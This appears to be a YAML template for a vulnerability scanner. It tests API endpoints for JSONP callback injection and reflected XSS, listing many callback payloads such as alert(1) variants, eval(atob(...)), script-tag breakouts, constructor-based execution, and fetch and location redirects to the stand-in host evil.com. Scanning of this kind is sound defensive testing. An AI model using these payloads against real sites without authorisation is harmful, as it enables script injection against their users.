id: json-hijacking-callback-attack

info:
  name: JSON Hijacking Callback Attack - JSONP Exploitation
  author: elite-red-team
  severity: high
  description: |
    Advanced JSON hijacking and JSONP callback exploitation detection.
    Tests various callback parameters and injection techniques to exploit JSONP vulnerabilities.
  reference:
    - https://owasp.org/www-community/attacks/JSONP_Injection
    - https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 20
  tags: jsonp,json-hijacking,callback,xss,injection

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/users"
      - "{{BaseURL}}/api/v1/users"
      - "{{BaseURL}}/api/data"
      - "{{BaseURL}}/api/v1/data"

    headers:
      Accept: "application/javascript, application/json, */*"
      Referer: "https://evil.com"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Content-Type: application/javascript"
          - "Content-Type: text/javascript"
        condition: or
        part: header

      - type: word
        words:
          - "("
          - ")"
          - "callback"
          - "jsonp"
        condition: and
        part: body

    extractors:
      - type: regex
        name: jsonp_response
        regex:
          - '([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(\s*\{.*?\}\s*\)'
        group: 1

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=alert"
      - "{{BaseURL}}/api/v1/users?callback=alert"
      - "{{BaseURL}}/api/data?callback=alert"
      - "{{BaseURL}}/api/v1/data?callback=alert"

    headers:
      Accept: "application/javascript"
      Origin: "https://evil.com"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert("
          - "alert({"
        condition: or
        part: body

      - type: word
        words:
          - "Content-Type: application/javascript"
          - "Content-Type: text/javascript"
        condition: or
        part: header

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=evil_function"
      - "{{BaseURL}}/api/users?jsonp=evil_function"
      - "{{BaseURL}}/api/users?cb=evil_function"
      - "{{BaseURL}}/api/users?_callback=evil_function"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "evil_function("
        part: body

      - type: word
        words:
          - "application/javascript"
          - "text/javascript"
        condition: or
        part: header

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=alert(1);//"
      - "{{BaseURL}}/api/users?callback=alert(document.domain);//"
      - "{{BaseURL}}/api/users?callback=eval(atob('YWxlcnQoMSk='));//"

    headers:
      Accept: "application/javascript"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert(1)"
          - "alert(document.domain)"
          - "eval(atob("
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=</script><script>alert(1)</script>"
      - "{{BaseURL}}/api/users?callback=';alert(1);//"
      - "{{BaseURL}}/api/users?callback=\";alert(1);//"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "</script><script>"
          - "';alert(1)"
          - "\";alert(1)"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=function(){alert(1)}"
      - "{{BaseURL}}/api/users?callback=(function(){alert(1)})()"
      - "{{BaseURL}}/api/users?callback=window.alert(1)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "function(){alert(1)}"
          - "(function(){alert(1)})()"
          - "window.alert(1)"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback[]=alert"
      - "{{BaseURL}}/api/users?callback%5B%5D=alert"
      - "{{BaseURL}}/api/users?callback.length=alert"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert("
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=alert&callback=console.log"
      - "{{BaseURL}}/api/users?callback=alert&jsonp=console.log"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert("
          - "console.log("
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=%61%6C%65%72%74"
      - "{{BaseURL}}/api/users?callback=\u0061\u006C\u0065\u0072\u0074"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert("
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=alert(String.fromCharCode(88,83,83))"
      - "{{BaseURL}}/api/users?callback=alert(/XSS/.source)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "String.fromCharCode"
          - "/XSS/.source"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/search?q=test&callback=alert"
      - "{{BaseURL}}/api/v1/search?query=test&callback=alert"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert("
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=top.alert"
      - "{{BaseURL}}/api/users?callback=parent.alert"
      - "{{BaseURL}}/api/users?callback=self.alert"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "top.alert("
          - "parent.alert("
          - "self.alert("
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=setTimeout(alert,1)"
      - "{{BaseURL}}/api/users?callback=setInterval(alert,1)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "setTimeout(alert,1)"
          - "setInterval(alert,1)"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=fetch('//evil.com')"
      - "{{BaseURL}}/api/users?callback=XMLHttpRequest"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "fetch('//evil.com')"
          - "XMLHttpRequest"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=location.href='//evil.com'"
      - "{{BaseURL}}/api/users?callback=document.location='//evil.com'"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "location.href='//evil.com'"
          - "document.location='//evil.com'"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=document.write('<script>alert(1)</script>')"
      - "{{BaseURL}}/api/users?callback=document.body.innerHTML='<img src=x onerror=alert(1)>'"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "document.write("
          - "document.body.innerHTML="
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=Object.constructor('alert(1)')()"
      - "{{BaseURL}}/api/users?callback=Function('alert(1)')()"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Object.constructor('alert(1)')()"
          - "Function('alert(1)')()"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=Array.constructor('alert(1)')()"
      - "{{BaseURL}}/api/users?callback=RegExp.constructor('alert(1)')()"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Array.constructor('alert(1)')()"
          - "RegExp.constructor('alert(1)')()"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/users?callback=import('data:text/javascript,alert(1)')"
      - "{{BaseURL}}/api/users?callback=eval('alert(1)')"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "import('data:text/javascript,alert(1)')"
          - "eval('alert(1)')"
        condition: or
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/api/users"

    headers:
      Content-Type: "application/json"
      Accept: "application/javascript"

    body: |
      {
        "callback": "alert",
        "jsonp": "alert",
        "cb": "alert"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "alert("
        part: body

      - type: word
        words:
          - "application/javascript"
          - "text/javascript"
        condition: or
        part: header